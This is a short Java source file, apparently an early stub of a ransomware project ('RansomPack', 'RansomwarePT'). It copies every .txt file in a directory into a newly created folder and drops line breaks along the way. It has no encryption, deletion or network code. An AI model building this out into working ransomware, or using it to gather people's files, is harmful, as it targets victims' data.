package RansomPack;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;

public class RansomwarePT {
	
	public static void InvasionT(String name, String dirLocal, String dirTarget){
		String targetDir = dirTarget + File.separator + name;
		createFile(targetDir);
		File[] dirsInRoot = subdirList(dirLocal);
		for(File file : dirsInRoot) {
			if(isTXT(file)) {
				String nameCopy = file.getName();
				String fulldir = targetDir + File.separatorChar + nameCopy;
				File newCopy = new File(fulldir);
				try(BufferedReader br = new BufferedReader(new FileReader(file));
					BufferedWriter bw = new BufferedWriter(new FileWriter(newCopy))){
					String line = br.readLine();
					while(line != null) {
						bw.write(line);
						line = br.readLine();
					}
				}
				catch(IOException e) {
					e.printStackTrace();
				}
			}
		}
	}

	public static File[] subdirList(String dirName) {
		File subdirC = new File(dirName);
		File[] subdirR = subdirC.listFiles();
		return subdirR;
	}
	
	public static boolean isTXT(File file) {
		if(file != null && file.getName().endsWith(".txt")) {
			return true;
		}
		return false;
	}
	
	public static String createFile(String dir) {
		File file = new File(dir);
		if(!file.exists()) {
			file.mkdir();
			return file.getAbsolutePath();
		}
		else {
			System.err.println("Folder already exists!!!");
		}
		return null;
	}
}
